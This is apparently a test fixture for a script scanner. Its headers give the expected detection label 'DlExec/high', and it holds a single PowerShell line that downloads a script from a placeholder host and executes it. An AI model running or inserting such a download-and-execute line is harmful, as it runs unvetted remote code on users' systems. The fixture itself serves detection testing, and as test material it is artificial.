# expect: DlExec/high
# url: https://example.net/s.ps1
& ([scriptblock]::Create((irm https://example.net/s.ps1)))
